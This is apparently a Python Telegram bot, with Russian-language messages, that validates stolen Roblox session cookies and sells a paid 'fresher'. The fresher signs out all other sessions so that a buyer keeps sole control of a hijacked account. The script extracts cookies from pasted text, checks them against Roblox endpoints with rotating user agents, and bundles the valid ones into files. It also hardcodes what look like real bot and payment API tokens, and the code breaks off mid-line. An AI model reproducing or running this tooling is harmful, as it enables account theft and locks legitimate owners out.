import os
import logging
import re
import random
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import requests
import json
from datetime import datetime, timedelta

# Конфигурация
BOT_TOKEN = "8204086100:AAFmfYGPLqtBpSpJk1FgyCwU87l6K2ZieTo"
CRYPTO_BOT_TOKEN = "470734:AAKKe0DuwX6a5WvXEUnsGGBrRSbyN3YJvxH"
CRYPTO_BOT_API_URL = "https://pay.crypt.bot/api/"
ADMIN_USERNAME = "@pirkw"

logging.basicConfig(level=logging.INFO)

class CryptoPayment:
    def __init__(self):
        self.api_url = CRYPTO_BOT_API_URL
        self.token = CRYPTO_BOT_TOKEN
        self.headers = {
            'Crypto-Pay-API-Token': self.token,
            'Content-Type': 'application/json'
        }
    
    async def create_invoice(self, amount: float, description: str, user_id: int):
        """Создание инвойса для оплаты фрешера"""
        try:
            payload = {
                'asset': 'USDT',
                'amount': str(amount),
                'description': description,
                'hidden_message': f'Оплата фрешера для пользователя {user_id}',
                'paid_btn_name': 'viewItem',
                'paid_btn_url': 'https://t.me/your_bot',
                'payload': str(user_id),
                'allow_comments': False,
                'allow_anonymous': False,
                'expires_in': 86400,
            }
            
            response = requests.post(
                f"{self.api_url}createInvoice",
                headers=self.headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return True, data['result']
                else:
                    return False, f"Ошибка API: {data.get('error', 'Unknown error')}"
            else:
                return False, f"HTTP ошибка: {response.status_code}"
                
        except Exception as e:
            return False, f"Ошибка создания инвойса: {str(e)}"
    
    async def check_invoice_status(self, invoice_id: int):
        """Проверка статуса инвойса"""
        try:
            response = requests.get(
                f"{self.api_url}getInvoices?invoice_ids={invoice_id}",
                headers=self.headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data['result']['items']:
                    invoice = data['result']['items'][0]
                    return True, invoice
                else:
                    return False, "Инвойс не найден"
            else:
                return False, f"HTTP ошибка: {response.status_code}"
                
        except Exception as e:
            return False, f"Ошибка проверки статуса: {str(e)}"

class RobloxCookieChecker:
    def __init__(self):
        self.valid_count = 0
        self.checked_count = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
        ]
        self.user_cookies = {}
        self.premium_users = {}
        self.crypto_payment = CryptoPayment()
        self.fresher_price = 1.0
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def make_robust_request(self, url, headers, max_retries=3):
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    print(f"⚠️ Rate limit hit, waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    continue
                return response
            except requests.exceptions.RequestException as e:
                print(f"⚠️ Request error (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(1, 2)
                    time.sleep(wait_time)
        return None

    def activate_premium(self, user_id):
        """Активация доступа к фрешеру"""
        self.premium_users[user_id] = {
            'activated_date': datetime.now(),
            'is_active': True,
            'payment_method': 'cryptobot'
        }

    def check_premium_access(self, user_id):
        """Проверка доступа к фрешеру"""
        return user_id in self.premium_users and self.premium_users[user_id]['is_active']

    def extract_cookies_from_text(self, text):
        """Извлечение куки из текста - УЛУЧШЕННАЯ ВЕРСИЯ"""
        cookies = []
        
        # Улучшенный паттерн для поиска куки
        patterns = [
            r'_\|WARNING:-DO-NOT-SHARE-THIS\.--[A-Za-z0-9+/=\-|\.]+',
            r'_\|WARNING:-DO-NOT-SHARE-THIS[^\\s]+',
            r'ROBLOSECURITY=[A-Za-z0-9+/=\-|\.]+'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                cookie_candidate = match.strip()
                # Фильтруем по длине и содержанию
                if len(cookie_candidate) > 100 and ('WARNING' in cookie_candidate or 'ROBLOSECURITY' in cookie_candidate):
                    # Очищаем от лишних символов
                    clean_cookie = re.sub(r'^[🍪🔐🍃]\s*', '', cookie_candidate)
                    clean_cookie = re.sub(r'^[Cc]ookie:\s*', '', clean_cookie)
                    clean_cookie = clean_cookie.strip()
                    
                    if clean_cookie not in cookies:
                        cookies.append(clean_cookie)
                        print(f"🔍 Найдена куки: {clean_cookie[:80]}...")
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        return cookie_data.strip()

    def refresh_cookie_properly(self, cookie_data):
        """Правильный фрешер куки - выкидывает всех других пользователей"""
        try:
            # Форматируем куки для использования в запросе
            if not cookie_data.startswith('.ROBLOSECURITY='):
                cookie_string = f'.ROBLOSECURITY={cookie_data}'
            else:
                cookie_string = cookie_data
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Cookie': cookie_string,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'X-CSRF-TOKEN': 'fetch'  # Сначала получаем токен
            }
            
            # Шаг 1: Получаем CSRF токен
            token_response = requests.post(
                'https://auth.roblox.com/v2/logout',
                headers=headers,
                timeout=10
            )
            
            # Извлекаем CSRF токен из заголовков
            csrf_token = None
            if 'x-csrf-token' in token_response.headers:
                csrf_token = token_response.headers['x-csrf-token']
            
            if not csrf_token:
                # Пробуем альтернативный метод получения токена
                token_response = requests.post(
                    'https://www.roblox.com/authentication/signoutfromallsessions',
                    headers=headers,
                    timeout=10
                )
                if 'x-csrf-token' in token_response.headers:
                    csrf_token = token_response.headers['x-csrf-token']
            
            if not csrf_token:
                return False, cookie_data, "❌ Не удалось получить CSRF токен"
            
            # Шаг 2: Выходим со всех сессий (выкидываем всех пользователей)
            headers['X-CSRF-TOKEN'] = csrf_token
            
            logout_response = requests.post(
                'https://www.roblox.com/authentication/signoutfromallsessions',
                headers=headers,
                timeout=10
            )
            
            if logout_response.status_code in [200, 403]:
                # Шаг 3: Получаем новую куки
                # Делаем запрос к защищенному эндпоинту чтобы получить новую сессию
                session_response = requests.get(
                    'https://users.roblox.com/v1/users/authenticated',
                    headers=headers,
                    timeout=10
                )
                
                # Ищем новую куки в заголовках
                if 'set-cookie' in session_response.headers:
                    new_cookies = session_response.headers['set-cookie']
                    roblosecurity_match = re.search(r'\.ROBLOSECURITY=([^;]+)', new_cookies)
                    if roblosecurity_match:
                        new_cookie = roblosecurity_match.group(1)
                        return True, new_cookie, "✅ Куки успешно обновлена! Все другие сессии закрыты."
                
                # Альтернативный метод - используем текущую куки (она уже обновилась)
                return True, cookie_data, "✅ Сессии обновлены! Все другие пользователи выкинуты."
            
            return False, cookie_data, "❌ Не удалось обновить сессии"
            
        except Exception as e:
            print(f"❌ Ошибка фрешера: {e}")
            return False, cookie_data, f"❌ Ошибка: {str(e)}"

    def simple_cookie_validation(self, cookie_data):
        """Проверка валидности куки"""
        self.checked_count += 1
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
        
        user_agent = self.get_random_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Cookie': cookie_string,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
        
        try:
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = requests.get(api_url, headers=headers, timeout=10)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data['id']
                    self.valid_count += 1
                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username, user_id
            
            return False, cookie_clean, "❌ INVALID - Cannot authenticate", "Unknown", "Unknown"
        
        except Exception as e:
            print(f"❌ Ошибка проверки: {e}")
            return False, cookie_clean, f"❌ ERROR - {str(e)}", "Unknown", "Unknown"

    def process_multiple_cookies(self, text, user_id):
        """Обработка множественных куки"""
        cookies = self.extract_cookies_from_text(text)
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        print(f"🔍 Найдено куки в тексте: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "❌ В тексте не найдено ни одной куки"
        
        self.user_cookies[user_id] = {
            'all_cookies': cookies,
            'valid_cookies': [],
            'invalid_cookies': [],
            'usernames': [],
            'user_ids': []
        }
        
        for i, cookie in enumerate(cookies, 1):
            print(f"🔍 Проверяю куки {i}/{total}")
            is_valid, clean_cookie, status, username, user_id_val = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                self.user_cookies[user_id]['usernames'].append(username)
                self.user_cookies[user_id]['user_ids'].append(user_id_val)
                results.append(f"✅ {i}/{total}: {username} - Valid")
            else:
                invalid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
                results.append(f"❌ {i}/{total}: Invalid")
        
        return valid_cookies, invalid_cookies, "\n".join(results)

    def create_individual_files(self, user_id):
        if user_id not in self.user_cookies:
            return None
        
        user_data = self.user_cookies[user_id]
        valid_cookies = user_data['valid_cookies']
        usernames = user_data['usernames']
        
        if not valid_cookies:
            return None
        
        import zipfile
        timestamp = datetime.now().strftime("%H%M%S")
        zip_filename = f"individual_cookies_{user_id}_{timestamp}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for i, (cookie, username) in enumerate(zip(valid_cookies, usernames), 1):
                safe_username = re.sub(r'[^\w\-_]', '_', username)
                filename = f"cookie_{i}_{safe_username}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                
                zipf.write(filename, filename)
                os.remove(filename)
        
        return zip_filename

    def get_command_keyboard(self):
        """Клавиатура с командами"""
        keyboard = [
            [InlineKeyboardButton("🔍 Проверить куки", callback_data="check_cookies")],
            [InlineKeyboardButton("📊 Статистика", callback_data="show_stats")],
            [InlineKeyboardButton("🔄 Фрешер куки", callback_data="fresher_info")],
            [InlineKeyboardButton("ℹ️ Помощь", callback_data="help_command")]
        ]
        return InlineKeyboardMarkup(keyboard)

checker = RobloxCookieChecker()

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Главное меню бота"""
    menu_text = """
🤖 БОТ ПРОВЕРКИ ROBLOX КУКИ

🎯 Доступные функции:

🔍 ПРОВЕРКА КУКИ - БЕСПЛАТНО
• Проверка валидности куки
• Определение пользователя
• Статистика аккаунта

🔄 ФРЕШЕР КУКИ - 1 USDT
• Обновление куки и выкидывание ВСЕХ других пользователей
• Оставляет доступ только вам
• Возвращает свежую валидную куки

💡 Просто отправьте куки для бесплатной проверки!
    """
    
    if hasattr(update, 'message'):
        await update.message.reply_text(
            menu_text,
            reply_markup=checker.get_command_keyboard()
        )
    else:
        await update.edit_message_text(
            menu_text,
            reply_markup=checker.get_command_keyboard()
        )

async def show_fresher_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Информация о фрешере"""
    user_id = update.effective_user.id
    has_premium = checker.check_premium_access(user_id)
    
    if has_premium:
        fresher_text = """
🔄 ФРЕШЕР КУКИ - АКТИВЕН ✅

⚡ Ваш фрешер готов к работе!

Что делает фрешер:
• Выкидывает ВСЕХ других пользователей с аккаунта
• Оставляет доступ только вам
• Возвращает свежую валидную куки
• Гарантирует единоличный доступ

Как использовать:
1. Отправьте валидную куки для проверки
2. После проверки нажмите "🔄 Обновить куки"
3. Получите новую куки файлом
        """
        keyboard = [
            [InlineKeyboardButton("🔍 Проверить куки", callback_data="check_cookies")],
            [InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")]
        ]
    else:
        fresher_text = """
🔄 ФРЕШЕР КУКИ - 1 USDT

🔥 МОЩНЫЙ ФРЕШЕР КУКИ:

Что вы получаете:
• Выкидываете ВСЕХ других пользователей с аккаунта
• Оставляете доступ только себе
• Получаете свежую валидную куки
• Гарантия работы или возврат средств

💎 Стоимость: 1 USDT (≈75₽)

⚡ Работает только с валидными куки!
        """
        keyboard = [
            [InlineKeyboardButton("💎 Купить фрешер за 1 USDT", callback_data="buy_fresher")],
            [InlineKeyboardButton("🔍 Бесплатная проверка", callback_data="check_cookies")],
            [InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if hasattr(update, 'message'):
        await update.message.reply_text(fresher_text, reply_markup=reply_markup)
    else:
        await update.edit_message_text(fresher_text, reply_markup=reply_markup)

async def create_payment_invoice(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Создание инвойса для оплаты фрешера"""
    amount = checker.fresher_price
    
    success, result = await checker.crypto_payment.create_invoice(
        amount=amount,
        description="Доступ к фрешеру куки - выкидывание всех пользователей",
        user_id=user_id
    )
    
    if success:
        invoice_url = result['pay_url']
        invoice_id = result['invoice_id']
        
        payment_text = f"""
💎 ОПЛАТА ФРЕШЕРА

Сумма: {amount} USDT (≈75₽)
Сеть: TRC-20 (Tron)

⚡ После оплаты вы получите:
• Доступ к мощному фрешеру
• Возможность выкидывать всех пользователей
• Свежие валидные куки
• Гарантия работы

Для оплаты:
1. Нажмите "Перейти к оплате"
2. Оплатите {amount} USDT
3. Отправьте скриншот {ADMIN_USERNAME}
4. Получите доступ к фрешеру!
        """
        
        keyboard = [
            [InlineKeyboardButton("🔗 Перейти к оплате", url=invoice_url)],
            [InlineKeyboardButton("📸 Отправить скриншот", url=f"https://t.me/{ADMIN_USERNAME[1:]}")],
            [InlineKeyboardButton("🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton("🔙 Назад", callback_data="fresher_info")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if hasattr(update, 'message'):
            await update.message.reply_text(payment_text, reply_markup=reply_markup)
        else:
            await update.edit_message_text(payment_text, reply_markup=reply_markup)
    else:
        error_text = f"""
❌ ОШИБКА СОЗДАНИЯ СЧЕТА

Не удалось создать счет для оплаты.
Пожалуйста, попробуйте позже или свяжитесь с {ADMIN_USERNAME}

Ошибка: {result}
        """
        await update.edit_message_text(error_text)

async def send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results):
    """Отправка результатов проверки"""
    has_premium = checker.check_premium_access(user_id)
    
    summary = f"""
📋 РЕЗУЛЬТАТЫ ПРОВЕРКИ:

• Всего обработано: {len(valid_cookies) + len(invalid_cookies)}
• ✅ Валидных: {len(valid_cookies)}
• ❌ Невалидных: {len(invalid_cookies)}
• 📊 Успех: {len(valid_cookies)/(len(valid_cookies) + len(invalid_cookies))*100:.1f}%

{'💎 Статус: Фрешер доступен' if has_premium else '💡 Фрешер: 1 USDT'}
    """
    
    keyboard = [
        [InlineKeyboardButton("📁 Распределить по файлам", callback_data="distribute_files")],
        [InlineKeyboardButton("📦 Скачать общий файл", callback_data="download_combined")]
    ]
    
    if has_premium and valid_cookies:
        keyboard.append([InlineKeyboardButton("🔄 Обновить куки", callback_data="refresh_cookies")])
    elif valid_cookies:
        keyboard.append([InlineKeyboardButton("💎 Купить фрешер за 1 USDT", callback_data="buy_fresh
